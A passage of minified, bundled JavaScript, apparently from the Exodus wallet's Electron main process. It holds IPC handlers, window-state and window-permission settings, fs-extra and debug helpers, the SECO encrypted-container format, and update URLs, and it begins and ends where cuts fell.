            throw (
              ((e.returnValue = void 0), new Error(`Unsupported type: ${t}`))
            );
          e.returnValue = r.getPath(t);
        }
      }),
      l.on.set("app:os:cpus", (e) => {
        e.returnValue = c.cpus().length;
      }),
      l.handle.set("app:os:info", () => ({
        arch: c.arch(),
        platform: c.platform(),
        type: c.type(),
        release: c.release(),
        freemem: c.freemem(),
        totalmem: c.totalmem(),
        cpus: c.cpus().length,
      }));
    const f = (e) => {
      const t = o.fromWebContents(e);
      if (t) return t;
      const n = a(e);
      return n ? u(n) : void 0;
    };
    l.on.set("sender:position:get", (e, t = {}) => {
      const n = f(e.sender);
      e.returnValue = n ? n.getPosition() : void 0;
    }),
      l.on.set("sender:size:get", (e, t = {}) => {
        const n = f(e.sender);
        e.returnValue = n ? n.getSize() : void 0;
      }),
      l.on.set("sender:sheetOffset:set", (e, ...t) => {
        const n = f(e.sender);
        n && n.setSheetOffset(...t), (e.returnValue = n ? 0 : 1);
      }),
      l.on.set("sender:close", (e, t = {}) => {
        f(e.sender).close(), (e.returnValue = void 0);
      }),
      l.handle.set("screen:display:all", () => i.getAllDisplays()),
      l.handle.set("screen:display:current", (e) => {
        const t = f(e.sender);
        if (!t) return;
        const [n, r] = t.getPosition();
        return i.getDisplayNearestPoint({ x: n, y: r });
      }),
      l.handle.set("screen:capturer:sources", async () => {
        const e = await s.getSources({ types: ["screen"] });
        return JSON.parse(JSON.stringify(e));
      }),
      (e.exports = l);
  },
  function (e, t, n) {
    "use strict";
    var r = n(1),
      o = n(0),
      i = n(181),
      s = n(180),
      c = n(179);
    e.exports = function (e) {
      var t,
        n,
        a,
        u = o.app,
        l = o.screen,
        f = 100,
        d = Object.assign(
          {
            file: "window-state.json",
            path: u.getPath("userData"),
            maximize: !0,
            fullScreen: !0,
          },
          e
        ),
        p = r.join(d.path, d.file);
      function h() {
        return (
          t &&
          Number.isInteger(t.x) &&
          Number.isInteger(t.y) &&
          Number.isInteger(t.width) &&
          Number.isInteger(t.height)
        );
      }
      function m(e) {
        if ((e = e || n)) {
          var r = e.getBounds();
          (function (e) {
            return !e.isMaximized() && !e.isMinimized() && !e.isFullScreen();
          })(e) &&
            ((t.x = r.x),
            (t.y = r.y),
            (t.width = r.width),
            (t.height = r.height)),
            (t.isMaximized = e.isMaximized()),
            (t.isFullScreen = e.isFullScreen()),
            (t.displayBounds = l.getDisplayMatching(r).bounds);
        }
      }
      function y(e) {
        e && m(e);
        try {
          s.sync(r.dirname(p)), i.writeFileSync(p, t);
        } catch (e) {}
      }
      function w() {
        clearTimeout(a), (a = setTimeout(m, f));
      }
      function b() {
        m();
      }
      function g() {
        E(), y();
      }
      function E() {
        n &&
          (n.removeListener("resize", w),
          n.removeListener("move", w),
          clearTimeout(a),
          n.removeListener("close", b),
          n.removeListener("closed", g),
          (n = null));
      }
      try {
        t = i.readFileSync(p);
      } catch (e) {}
      return (
        (function () {
          if (t && (h() || t.isMaximized || t.isFullScreen)) {
            if (h() && t.displayBounds) {
              var e = l.getDisplayMatching(t).bounds;
              c(t.displayBounds, e, { strict: !0 }) ||
                (e.width < t.displayBounds.width &&
                  (t.x > e.width && (t.x = 0),
                  t.width > e.width && (t.width = e.width)),
                e.height < t.displayBounds.height &&
                  (t.y > e.height && (t.y = 0),
                  t.height > e.height && (t.height = e.height)));
            }
          } else t = null;
        })(),
        (t = Object.assign(
          { width: d.defaultWidth || 800, height: d.defaultHeight || 600 },
          t
        )),
        {
          get x() {
            return t.x;
          },
          get y() {
            return t.y;
          },
          get width() {
            return t.width;
          },
          get height() {
            return t.height;
          },
          get isMaximized() {
            return t.isMaximized;
          },
          get isFullScreen() {
            return t.isFullScreen;
          },
          saveState: y,
          unmanage: E,
          manage: function (e) {
            d.maximize && t.isMaximized && e.maximize(),
              d.fullScreen && t.isFullScreen && e.setFullScreen(!0),
              e.on("resize", w),
              e.on("move", w),
              e.on("close", b),
              e.on("closed", g),
              (n = e);
          },
        }
      );
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "CHANNEL_PREFIX", function () {
      return r;
    });
    const r = "electron-rpc-broadcast";
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "meta", function () {
      return l;
    });
    var r = n(0),
      o = n(1),
      i = n.n(o),
      s = n(13),
      c = n(5);
    const a = r.app.getAppPath();
    function u(e) {
      if (
        !(function (e) {
          const t = i.a.basename(e);
          return (
            !!/^[a-z-]+(\.dev)?\.html$/.test(t) &&
            e === i.a.join("src/static", t)
          );
        })(e)
      )
        throw new Error("Unexpected html file path");
      const t = i.a.join(a, e);
      return Object(s.pathToFileURL)(t).toString();
    }
    const l = new Map(
      Object.entries({
        background: {
          url: u(c.WINDOW_BACKGROUND),
          protocols: ["file:"],
          offline: !0,
        },
        dapp: {
          protocols: ["https:", "wss:", "exodus-dapp-api:", "localhost"],
          multiple: !0,
          parallel: !0,
          startUrlProtocolIsIntercepted: !0,
        },
        nfts: {
          url: u(c.WINDOW_NFTS),
          protocols: ["file:", "https:", "exodus-nfts-api:", ...[]],
          domains: ["nfts-proxy.exodus.io", ...[]],
          permissions: ["clipboard-sanitized-write"],
        },
        ui: {
          persistName: "main",
          url: u(c.WINDOW_EXODUS),
          protocols: ["file:", "https:", "wss:", "localhost"],
          domains: "*",
          persistent: !0,
          ipc: !0,
          permissions: [
            "media",
            "openExternal",
            "clipboard-sanitized-write",
            "clipboard-read",
          ],
          flags: ["trezor-origin"],
          downloads: [
            {
              prefix: "blob:file://",
              mimetypes: ["application/pdf"],
              open: !0,
            },
          ],
        },
        keyviewer: {
          url: u(c.WINDOW_KEYVIEWER),
          protocols: ["file:"],
          offline: !0,
          multiple: !0,
          ipc: !0,
        },
        monero: {
          url: u(c.WINDOW_MONERO),
          protocols: ["file:", "https:", "wss:", "localhost"],
          domains: "*",
          persistent: !0,
          ipc: !0,
        },
        network: {
          url: u(c.WINDOW_NETWORK),
          protocols: ["file:", "https:", "wss:", "localhost"],
          domains: "*",
          persistent: !0,
          ipc: !0,
        },
        core: {
          url: u(c.WINDOW_CORE),
          protocols: ["file:"],
          offline: !0,
          ipc: !0,
        },
        passphrase: {
          url: u(c.WINDOW_PASSPHRASE),
          protocols: ["file:"],
          offline: !0,
          ipc: !0,
        },
        "scan-qr": {
          url: u(c.WINDOW_SCAN_QR),
          protocols: ["file:"],
          offline: !0,
          ipc: !0,
          permissions: ["media"],
        },
        unlock: {
          url: u(c.WINDOW_UNLOCK),
          protocols: ["file:"],
          offline: !0,
          ipc: !0,
        },
        wallet: {
          url: u(c.WINDOW_WALLET),
          protocols: ["file:", "https:"],
          domains: ["server.exodus.io", "exodusapp.blob.core.windows.net"],
          multiple: !0,
          persistent: !0,
          ipc: !0,
        },
      })
    );
  },
  function (e, t, n) {
    e.exports = function (e) {
      function t(e) {
        let n,
          o = null;
        function i(...e) {
          if (!i.enabled) return;
          const r = i,
            o = Number(new Date()),
            s = o - (n || o);
          (r.diff = s),
            (r.prev = n),
            (r.curr = o),
            (n = o),
            (e[0] = t.coerce(e[0])),
            "string" != typeof e[0] && e.unshift("%O");
          let c = 0;
          (e[0] = e[0].replace(/%([a-zA-Z%])/g, (n, o) => {
            if ("%%" === n) return "%";
            c++;
            const i = t.formatters[o];
            if ("function" == typeof i) {
              const t = e[c];
              (n = i.call(r, t)), e.splice(c, 1), c--;
            }
            return n;
          })),
            t.formatArgs.call(r, e),
            (r.log || t.log).apply(r, e);
        }
        return (
          (i.namespace = e),
          (i.useColors = t.useColors()),
          (i.color = t.selectColor(e)),
          (i.extend = r),
          (i.destroy = t.destroy),
          Object.defineProperty(i, "enabled", {
            enumerable: !0,
            configurable: !1,
            get: () => (null === o ? t.enabled(e) : o),
            set: (e) => {
              o = e;
            },
          }),
          "function" == typeof t.init && t.init(i),
          i
        );
      }
      function r(e, n) {
        const r = t(this.namespace + (void 0 === n ? ":" : n) + e);
        return (r.log = this.log), r;
      }
      function o(e) {
        return e
          .toString()
          .substring(2, e.toString().length - 2)
          .replace(/\.\*\?$/, "*");
      }
      return (
        (t.debug = t),
        (t.default = t),
        (t.coerce = function (e) {
          return e instanceof Error ? e.stack || e.message : e;
        }),
        (t.disable = function () {
          const e = [
            ...t.names.map(o),
            ...t.skips.map(o).map((e) => "-" + e),
          ].join(",");
          return t.enable(""), e;
        }),
        (t.enable = function (e) {
          let n;
          t.save(e), (t.names = []), (t.skips = []);
          const r = ("string" == typeof e ? e : "").split(/[\s,]+/),
            o = r.length;
          for (n = 0; n < o; n++)
            r[n] &&
              ("-" === (e = r[n].replace(/\*/g, ".*?"))[0]
                ? t.skips.push(new RegExp("^" + e.substr(1) + "$"))
                : t.names.push(new RegExp("^" + e + "$")));
        }),
        (t.enabled = function (e) {
          if ("*" === e[e.length - 1]) return !0;
          let n, r;
          for (n = 0, r = t.skips.length; n < r; n++)
            if (t.skips[n].test(e)) return !1;
          for (n = 0, r = t.names.length; n < r; n++)
            if (t.names[n].test(e)) return !0;
          return !1;
        }),
        (t.humanize = n(122)),
        (t.destroy = function () {
          console.warn(
            "Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`."
          );
        }),
        Object.keys(e).forEach((n) => {
          t[n] = e[n];
        }),
        (t.names = []),
        (t.skips = []),
        (t.formatters = {}),
        (t.selectColor = function (e) {
          let n = 0;
          for (let t = 0; t < e.length; t++)
            (n = (n << 5) - n + e.charCodeAt(t)), (n |= 0);
          return t.colors[Math.abs(n) % t.colors.length];
        }),
        t.enable(t.load()),
        t
      );
    };
  },
  function (e, t) {
    (e.exports.getLockFile = (e) => `${e}.lock`),
      (e.exports.getTmpFile = (e) => `${e}.tmp`),
      (e.exports.getFlagFile = (e) => `${e}.failed`);
  },
  function (e, t, n) {
    "use strict";
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.struct = void 0),
      (t.decode = d),
      (t.encode = function (e) {
        return f.encode(e);
      }),
      (t.computeChecksum = p),
      (t.checkContents = function (e) {
        let t = d(e);
        return t.checksum.equals(p(t.metadata, t.blob));
      });
    var r,
      o = n(53),
      i = (r = o) && r.__esModule ? r : { default: r },
      s = n(142),
      c = (function (e) {
        if (e && e.__esModule) return e;
        var t = {};
        if (null != e)
          for (var n in e)
            Object.prototype.hasOwnProperty.call(e, n) && (t[n] = e[n]);
        return (t.default = e), t;
      })(n(66)),
      a = n(65),
      u = n(86),
      l = n(83);
    const f = (t.struct = (0, i.default)(
      (0, a.vsf)([
        ["header", (0, o.Buffer)(u.HEADER_LEN_BYTES)],
        ["checksum", (0, o.Buffer)(32)],
        ["metadata", (0, o.Buffer)(l.METADATA_LEN_BYTES)],
        ["blob", (0, o.VarBuffer)(o.UInt32BE)],
      ])
    ));
    function d(e) {
      return f.decode(e);
    }
    function p(e, t) {
      return c.sha256(Buffer.concat([e, (0, s.fromUInt32BE)(t.byteLength), t]));
    }
  },
  function (e, t, n) {
    "use strict";
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.struct = t.METADATA_LEN_BYTES = void 0),
      (t.decode = function (e) {
        e.byteLength > a &&
          console.warn(
            "metadata greater than `${METADATA_LEN_BYTES}` bytes, are you sure this is the SECO metadata?"
          );
        return u.decode(e);
      }),
      (t.encode = l),
      (t.serialize = function (e) {
        let t = Buffer.alloc(a);
        return l(e).copy(t), t;
      }),
      (t.create = function (e = (0, s.createScryptParams)()) {
        return {
          scrypt: e,
          cipher: "aes-256-gcm",
          blobKey: {
            iv: Buffer.alloc(s.IV_LEN_BYTES),
            authTag: Buffer.alloc(16),
            key: Buffer.alloc(32),
          },
          blob: { iv: Buffer.alloc(s.IV_LEN_BYTES), authTag: Buffer.alloc(16) },
        };
      }),
      (t.encryptBlobKey = function (e, t, n) {
        const {
          authTag: r,
          blob: o,
          iv: i,
          salt: c,
        } = (0, s.boxEncrypt)(t, n, e.scrypt);
        (e.scrypt.salt = c), (e.blobKey = { authTag: r, iv: i, key: o });
      }),
      (t.decryptBlobKey = function (e, t) {
        return (0, s.boxDecrypt)(t, e.blobKey.key, e.blobKey, e.scrypt);
      });
    var r,
      o = n(53),
      i = (r = o) && r.__esModule ? r : { default: r },
      s = n(66),
      c = n(65);
    const a = (t.METADATA_LEN_BYTES = 256),
      u = (t.struct = (0, i.default)(
        (0, c.vsf)([
          [
            "scrypt",
            [
              ["salt", (0, o.Buffer)(32)],
              ["n", o.UInt32BE],
              ["r", o.UInt32BE],
              ["p", o.UInt32BE],
            ],
          ],
          ["cipher", (0, c.CStr)(32)],
          [
            "blobKey",
            [
              ["iv", (0, o.Buffer)(s.IV_LEN_BYTES)],
              ["authTag", (0, o.Buffer)(16)],
              ["key", (0, o.Buffer)(32)],
            ],
          ],
          [
            "blob",
            [
              ["iv", (0, o.Buffer)(s.IV_LEN_BYTES)],
              ["authTag", (0, o.Buffer)(16)],
            ],
          ],
        ])
      ));
    function l(e) {
      return u.encode(e);
    }
  },
  function (e, t, n) {
    "use strict";
    var r = n(38);
    e.exports = function (e) {
      if (!r.isAbstractCodec(e))
        throw new TypeError("lengthType is invalid codec");
      function t(t) {
        return e.encodingLength(t.length) + t.length;
      }
      return {
        encode: function n(r, o, i) {
          if (!Buffer.isBuffer(r))
            throw new TypeError("value must be a Buffer instance");
          if (
            (o || (o = new Buffer(t(r))),
            i || (i = 0),
            e.encode(r.length, o, i),
            (i += e.encode.bytes) + r.length > o.length)
          )
            throw new RangeError("destination buffer is too small");
          return (
            r.copy(o, i, 0, r.length), (n.bytes = e.encode.bytes + r.length), o
          );
        },
        decode: function t(n, r, o) {
          r || (r = 0), o || (o = n.length);
          var i = e.decode(n, r, o);
          if ((r += e.decode.bytes) + i > o)
            throw new RangeError("not enough data for decode");
          return (t.bytes = e.decode.bytes + i), new Buffer(n.slice(r, r + i));
        },
        encodingLength: function (e) {
          if (!Buffer.isBuffer(e))
            throw new TypeError("value must be a Buffer instance");
          return t(e);
        },
      };
    };
  },
  function (e, t, n) {
    "use strict";
    e.exports = function (e) {
      if ("number" != typeof e) throw new TypeError("length must be a number");
      function t(t, n, r) {
        if (!Buffer.isBuffer(t))
          throw new TypeError("value must be a Buffer instance");
        if (t.length !== e)
          throw new RangeError("value.length is out of bounds");
        if (!n) return new Buffer(t);
        if ((r || (r = 0), r + e > n.length))
          throw new RangeError("destination buffer is too small");
        return t.copy(n, r), n;
      }
      function n(t, n, r) {
        if ((n || (n = 0), r || (r = t.length), n + e > r))
          throw new RangeError("not enough data for decode");
        return new Buffer(t.slice(n, n + e));
      }
      return (
        (t.bytes = n.bytes = e),
        {
          encode: t,
          decode: n,
          encodingLength: function () {
            return e;
          },
        }
      );
    };
  },
  function (e, t, n) {
    "use strict";
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.struct = t.MAGIC = t.HEADER_VERSION_TAG = t.HEADER_LEN_BYTES = void 0),
      (t.checkMagic = l),
      (t.decode = function (e) {
        e.byteLength > c &&
          console.warn(
            `header greater than ${c} bytes, are you sure this is the header?`
          );
        return f.decode(e);
      }),
      (t.encode = d),
      (t.serialize = function (e) {
        let t = Buffer.alloc(c);
        return d(e).copy(t), t;
      }),
      (t.create = function (
        { appName: e, appVersion: t } = { appName: "", appVersion: "" }
      ) {
        return {
          magic: u,
          version: 0,
          reserved: 0,
          versionTag: a,
          appName: e,
          appVersion: t,
        };
      });
    var r,
      o = n(53),
      i = (r = o) && r.__esModule ? r : { default: r },
      s = n(65);
    const c = (t.HEADER_LEN_BYTES = 224),
      a = (t.HEADER_VERSION_TAG = "seco-v0-scrypt-aes"),
      u = (t.MAGIC = Buffer.from("SECO", "utf8"));
    function l(e) {
      if (!e.equals(u)) throw new RangeError("Invalid secure container magic.");
    }
    const f = (t.struct = (0, i.default)(
      (0, s.vsf)([
        ["magic", (0, o.Bound)(i.default.Buffer(4), l)],
        ["version", o.UInt32BE],
        ["reserved", o.UInt32BE],
        ["versionTag", (0, o.VarString)(o.UInt8)],
        ["appName", (0, o.VarString)(o.UInt8, "utf-8")],
        ["appVersion", (0, o.VarString)(o.UInt8, "utf-8")],
      ])
    ));
    function d(e) {
      return f.encode(e);
    }
  },
  function (e, t) {
    e.exports = function (e) {
      if ("function" == typeof Buffer.allocUnsafe)
        try {
          return Buffer.allocUnsafe(e);
        } catch (t) {
          return new Buffer(e);
        }
      return new Buffer(e);
    };
  },
  function (e, t, n) {
    e.exports = { copySync: n(169) };
  },
  function (e, t, n) {
    "use strict";
    const r = n(7),
      o = n(36),
      i = n(1);
    e.exports = {
      hasMillisRes: function (e) {
        let t = i.join(
          "millis-test" +
            Date.now().toString() +
            Math.random().toString().slice(2)
        );
        t = i.join(o.tmpdir(), t);
        const n = new Date(1435410243862);
        r.writeFile(
          t,
          "https://github.com/jprichardson/node-fs-extra/pull/141",
          (o) => {
            if (o) return e(o);
            r.open(t, "r+", (o, i) => {
              if (o) return e(o);
              r.futimes(i, n, n, (n) => {
                if (n) return e(n);
                r.close(i, (n) => {
                  if (n) return e(n);
                  r.stat(t, (t, n) => {
                    if (t) return e(t);
                    e(null, n.mtime > 1435410243e3);
                  });
                });
              });
            });
          }
        );
      },
      hasMillisResSync: function () {
        let e = i.join(
          "millis-test-sync" +
            Date.now().toString() +
            Math.random().toString().slice(2)
        );
        e = i.join(o.tmpdir(), e);
        const t = new Date(1435410243862);
        r.writeFileSync(
          e,
          "https://github.com/jprichardson/node-fs-extra/pull/141"
        );
        const n = r.openSync(e, "r+");
        return (
          r.futimesSync(n, t, t),
          r.closeSync(n),
          r.statSync(e).mtime > 1435410243e3
        );
      },
      timeRemoveMillis: function (e) {
        if ("number" == typeof e) return 1e3 * Math.floor(e / 1e3);
        if (e instanceof Date)
          return new Date(1e3 * Math.floor(e.getTime() / 1e3));
        throw new Error("fs-extra: timeRemoveMillis() unknown parameter type");
      },
      utimesMillis: function (e, t, n, o) {
        r.open(e, "r+", (e, i) => {
          if (e) return o(e);
          r.futimes(i, t, n, (e) => {
            r.close(i, (t) => {
              o && o(e || t);
            });
          });
        });
      },
      utimesMillisSync: function (e, t, n) {
        const o = r.openSync(e, "r+");
        return r.futimesSync(o, t, n), r.closeSync(o);
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(1);
    function o(e) {
      return (e = r.normalize(r.resolve(e)).split(r.sep)).length > 0
        ? e[0]
        : null;
    }
    const i = /[<>:"|?*]/;
    e.exports = {
      getRootPath: o,
      invalidWin32Path: function (e) {
        const t = o(e);
        return (e = e.replace(t, "")), i.test(e);
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(7),
      o = n(1),
      i = n(20).mkdirs,
      s = n(34).pathExists,
      c = n(89).utimesMillis,
      a = Symbol("notExist"),
      u = Symbol("existsReg");
    function l(e, t, n, r) {
      const c = o.dirname(t);
      s(c, (o, s) =>
        o
          ? r(o)
          : s
          ? f(e, t, n, r)
          : void i(c, (o) => (o ? r(o) : f(e, t, n, r)))
      );
    }
    function f(e, t, n, r) {
      return n.filter ? d(p, e, t, n, r) : p(e, t, n, r);
    }
    function d(e, t, n, r, o) {
      Promise.resolve(r.filter(t, n)).then(
        (i) => (i ? e(t, n, r, o) : o()),
        (e) => o(e)
      );
    }
    function p(e, t, n, i) {
      (n.dereference ? r.stat : r.lstat)(e, (s, c) =>
        s
          ? i(s)
          : c.isDirectory()
          ? (function (e, t, n, o, i) {
              b(n, (s, c) =>
                s
                  ? i(s)
                  : c === a
                  ? g(t, n)
                    ? i(
                        new Error(
                          `Cannot copy '${t}' to a subdirectory of itself, '${n}'.`
                        )
                      )
                    : (function (e, t, n, o, i) {
                        r.mkdir(n, e.mode, (s) => {
                          if (s) return i(s);
                          r.chmod(n, e.mode, (e) => (e ? i(e) : w(t, n, o, i)));
                        });
                      })(e, t, n, o, i)
                  : c === u
                  ? g(t, n)
                    ? i(
                        new Error(
                          `Cannot copy '${t}' to a subdirectory of itself, '${n}'.`
                        )
                      )
                    : (function (e, t, n, o) {
                        r.stat(t, (r, i) =>
                          r
                            ? o(r)
                            : i.isDirectory()
                            ? w(e, t, n, o)
                            : o(
                                new Error(
                                  `Cannot overwrite non-directory '${t}' with directory '${e}'.`
                                )
                              )
                        );
                      })(t, n, o, i)
                  : t === c
                  ? i()
                  : w(t, n, o, i)
              );
            })(c, e, t, n, i)
          : c.isFile() || c.isCharacterDevice() || c.isBlockDevice()
          ? (function (e, t, n, r, o) {
              b(n, (i, s) =>
                i
                  ? o(i)
                  : s === a
                  ? m(e, t, n, r, o)
                  : s === u
                  ? h(e, t, n, r, o)
                  : t === s
                  ? o()
                  : h(e, t, n, r, o)
              );
            })(c, e, t, n, i)
          : c.isSymbolicLink()
          ? (function (e, t, n, i) {
              r.readlink(e, (e, s) => {
                if (e) return i(e);
                n.dereference && (s = o.resolve(process.cwd(), s)),
                  b(t, (e, c) =>
                    e
                      ? i(e)
                      : c === a || c === u
                      ? r.symlink(s, t, i)
                      : (n.dereference && (c = o.resolve(process.cwd(), c)),
                        c === s
                          ? i()
                          : void r.stat(t, (e, n) =>
                              e
                                ? i(e)
                                : n.isDirectory() && g(c, s)
                                ? i(
                                    new Error(
                                      `Cannot overwrite '${c}' with '${s}'.`
                                    )
                                  )
                                : (function (e, t, n) {
                                    r.unlink(t, (o) =>
                                      o ? n(o) : r.symlink(e, t, n)
                                    );
                                  })(s, t, i)
                            ))
                  );
              });
            })(e, t, n, i)
          : void 0
      );
    }
    function h(e, t, n, o, i) {
      if (!o.overwrite)
        return o.errorOnExist ? i(new Error(`'${n}' already exists`)) : i();
      r.unlink(n, (r) => (r ? i(r) : m(e, t, n, o, i)));
    }
    function m(e, t, n, o, i) {
      return "function" == typeof r.copyFile
        ? r.copyFile(t, n, (t) => (t ? i(t) : y(e, n, o, i)))
        : (function (e, t, n, o, i) {
            const s = r.createReadStream(t);
            s.on("error", (e) => i(e)).once("open", () => {
              const t = r.createWriteStream(n, { mode: e.mode });
              t.on("error", (e) => i(e))
                .on("open", () => s.pipe(t))
                .once("close", () => y(e, n, o, i));
            });
          })(e, t, n, o, i);
    }
    function y(e, t, n, o) {
      r.chmod(t, e.mode, (r) =>
        r ? o(r) : n.preserveTimestamps ? c(t, e.atime, e.mtime, o) : o()
      );
    }
    function w(e, t, n, i) {
      r.readdir(e, (r, s) =>
        r
          ? i(r)
          : (function e(t, n, r, i, s) {
              const c = t.pop();
              if (!c) return s();
              f(o.join(n, c), o.join(r, c), i, (o) =>
                o ? s(o) : e(t, n, r, i, s)
              );
            })(s, e, t, n, i)
      );
    }
    function b(e, t) {
      r.readlink(e, (e, n) =>
        e
          ? "ENOENT" === e.code
            ? t(null, a)
            : "EINVAL" === e.code || "UNKNOWN" === e.code
            ? t(null, u)
            : t(e)
          : t(null, n)
      );
    }
    function g(e, t) {
      const n = t.split(o.dirname(e) + o.sep)[1];
      if (n) {
        const r = n.split(o.sep)[0];
        return !!r && e !== t && t.indexOf(e) > -1 && r === o.basename(e);
      }
      return !1;
    }
    e.exports = function (e, t, n, r) {
      return (
        "function" != typeof n || r
          ? "function" == typeof n && (n = { filter: n })
          : ((r = n), (n = {})),
        (r = r || function () {}),
        ((n = n || {}).clobber = !("clobber" in n && !n.clobber)),
        (n.overwrite = "overwrite" in n ? !!n.overwrite : n.clobber),
        n.preserveTimestamps &&
          "ia32" === process.arch &&
          console.warn(
            "fs-extra: Using the preserveTimestamps option in 32-bit node is not recommended;\n\n    see https://github.com/jprichardson/node-fs-extra/issues/269"
          ),
        (e = o.resolve(e)) === (t = o.resolve(t))
          ? r(new Error("Source and destination must not be the same."))
          : n.filter
          ? d(l, e, t, n, r)
          : l(e, t, n, r)
      );
    };
  },
  function (e, t, n) {
    const r = n(17).fromCallback,
      o = n(7),
      i = [
        "access",
        "appendFile",
        "chmod",
        "chown",
        "close",
        "copyFile",
        "fchmod",
        "fchown",
        "fdatasync",
        "fstat",
        "fsync",
        "ftruncate",
        "futimes",
        "lchown",
        "link",
        "lstat",
        "mkdir",
        "mkdtemp",
        "open",
        "readFile",
        "readdir",
        "readlink",
        "realpath",
        "rename",
        "rmdir",
        "stat",
        "symlink",
        "truncate",
        "unlink",
        "utimes",
        "writeFile",
      ].filter((e) => "function" == typeof o[e]);
    Object.keys(o).forEach((e) => {
      t[e] = o[e];
    }),
      i.forEach((e) => {
        t[e] = r(o[e]);
      }),
      (t.exists = function (e, t) {
        return "function" == typeof t
          ? o.exists(e, t)
          : new Promise((t) => o.exists(e, t));
      }),
      (t.read = function (e, t, n, r, i, s) {
        return "function" == typeof s
          ? o.read(e, t, n, r, i, s)
          : new Promise((s, c) => {
              o.read(e, t, n, r, i, (e, t, n) => {
                if (e) return c(e);
                s({ bytesRead: t, buffer: n });
              });
            });
      }),
      (t.write = function (e, t, n, r, i, s) {
        return "function" == typeof arguments[arguments.length - 1]
          ? o.write(e, t, n, r, i, s)
          : "string" == typeof t
          ? new Promise((i, s) => {
              o.write(e, t, n, r, (e, t, n) => {
                if (e) return s(e);
                i({ bytesWritten: t, buffer: n });
              });
            })
          : new Promise((s, c) => {
              o.write(e, t, n, r, i, (e, t, n) => {
                if (e) return c(e);
                s({ bytesWritten: t, buffer: n });
              });
            });
      });
  },
  function (e, t, n) {
    "use strict";
    const r = n(7);
    e.exports = {
      utimesMillis: function (e, t, n, o) {
        r.open(e, "r+", (e, i) => {
          if (e) return o(e);
          r.futimes(i, t, n, (e) => {
            r.close(i, (t) => {
              o && o(e || t);
            });
          });
        });
      },
      utimesMillisSync: function (e, t, n) {
        const o = r.openSync(e, "r+");
        return r.futimesSync(o, t, n), r.closeSync(o);
      },
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "PACKAGE", function () {
      return c;
    }),
      n.d(t, "ENV_PROD", function () {
        return a;
      }),
      n.d(t, "ENV_TEST", function () {
        return u;
      }),
      n.d(t, "ENV_DEV", function () {
        return l;
      }),
      n.d(t, "ENV_BUILD_NAME", function () {
        return f;
      }),
      n.d(t, "ENV_BUILD_EXODUS", function () {
        return d;
      }),
      n.d(t, "ENV_BUILD_EDEN", function () {
        return p;
      }),
      n.d(t, "ENV_EXODUS_PROD", function () {
        return h;
      }),
      n.d(t, "NIGHTLY_BUILD", function () {
        return m;
      }),
      n.d(t, "FLAG_FILE_RESTORE_MNEMONIC", function () {
        return b;
      }),
      n.d(t, "FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE", function () {
        return g;
      }),
      n.d(t, "AUTO_UPDATE_BASE_URL", function () {
        return E;
      }),
      n.d(t, "PROTOCOL", function () {
        return S;
      }),
      n.d(t, "UNLOCK_WINDOW_HEIGHT", function () {
        return O;
      }),
      n.d(t, "MIN_WIDTH", function () {
        return k;
      }),
      n.d(t, "MIN_HEIGHT", function () {
        return _;
      });
    var r = n(16),
      o = n(52),
      i = n.n(o),
      s = n(74);
    const c = s,
      a = !0,
      u = !1,
      l = u || !1,
      f = "",
      d = "" === f,
      p = "eden" === f,
      h = a && d,
      m = !1,
      y = l || p,
      w = y,
      b = "restore-mnemonic",
      g = "restore-from-current-phrase",
      E = p
        ? "https://updates.exodus.io/releases/eden"
        : "https://updates.exodus.io/releases",
      v = void 0,
      S =
        (v && v.match(/^http/),
        Math.max(6e3, 3640),
        i()("5m"),
        i()("3s"),
        [
          { localKey: r.fiatUnit, profilePath: "private.currency" },
          {
            localKey: r.moneroInitialHeight,
            profilePath: `private.${r.moneroInitialHeight}`,
          },
          {
            localKey: r.moneroSubaddressesEnabled,
            profilePath: r.moneroSubaddressesEnabled,
          },
          { localKey: r.themeName, profilePath: "theme" },
          { localKey: r.rbfEnabledBitcoin, profilePath: "rbfEnabled_bitcoin" },
          {
            localKey: r.rbfEnabledEthereum,
            profilePath: "rbfEnabled_ethereum",
          },
          {
            localKey: r.adaLegacyAddressEnabled,
            profilePath: "private.adaLegacyAddressEnabled",
          },
          {
            localKey: r.bitcoinLegacyAddressEnabled,
            profilePath: "bitcoinLegacyAddressEnabled",
          },
          {
            localKey: r.bitcoinTaprootAddressEnabled,
            profilePath: "bitcoinTaprootAddressEnabled",
          },
          {
            localKey: r.wentThroughFiatOnboarding,
            profilePath: "fiatOnramp.wentThroughFiatOnboarding",
          },
        ].concat(
          w ? { localKey: r.assets, profilePath: "private.assets" } : []
        ),
        p ? "exodus-eden" : "exodus"),
      O = 440,
      k = 1244,
      _ = 700;
  },
  function (e, t, n) {
    "use strict";
    var r = n(12),
      o = n.n(r);
    t.default = o()(["Window", [["Minimize", "CmdOrCtrl+M", "minimize"]]]);
  },
  function (e, t, n) {
    "use strict";
    var r = n(12),
      o = n.n(r);
    t.default = o()([
      "Edit",
      [
        ["Undo", "CmdOrCtrl+Z", "undo"],
        ["Redo", "Shift+CmdOrCtrl+Z", "redo"],
        "-",
        ["Cut", "CmdOrCtrl+X", "cut"],
        ["Copy", "CmdOrCtrl+C", "copy"],
        ["Paste", "CmdOrCtrl+V", "paste"],
        ["Select All", "CmdOrCtrl+A", "selectall"],
      ],
    ]);
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "updateNftsViewBounds", function () {
      return g;
    });
    var r = n(32),
      o = n.n(r),
      i = n(0),
      s = n(13),
      c = n(2),
      a = n(15),
      u = n(4),
      l = n(8),
      f = n(3),
      d = n(5),
      p = n(27),
      h = n(21),
      m = n(19);
    let y = null;
    const w = () => {
      f.appWindows.background.removeBrowserView(y),
        f.appWindows.ui.webContents.focus();
    };
    let b = 0;
    const g = (e) => {
      (b = e || b), y && Object(h.updateViewBounds)(y, b);
    };
    p.maximizeWorkaroundHandlers.add(() => g()),
      m.navbarHeightChangeHandlers.add(g),
      i.protocol.registerSchemesAsPrivileged([
        ...h.schemes,
        {
          scheme: "exodus-nfts-api",
          privileges: { bypassCSP: !0, secure: !0, supportFetchAPI: !0 },
        },
      ]),
      u.rpcMain.handle("nfts:load", async () => {
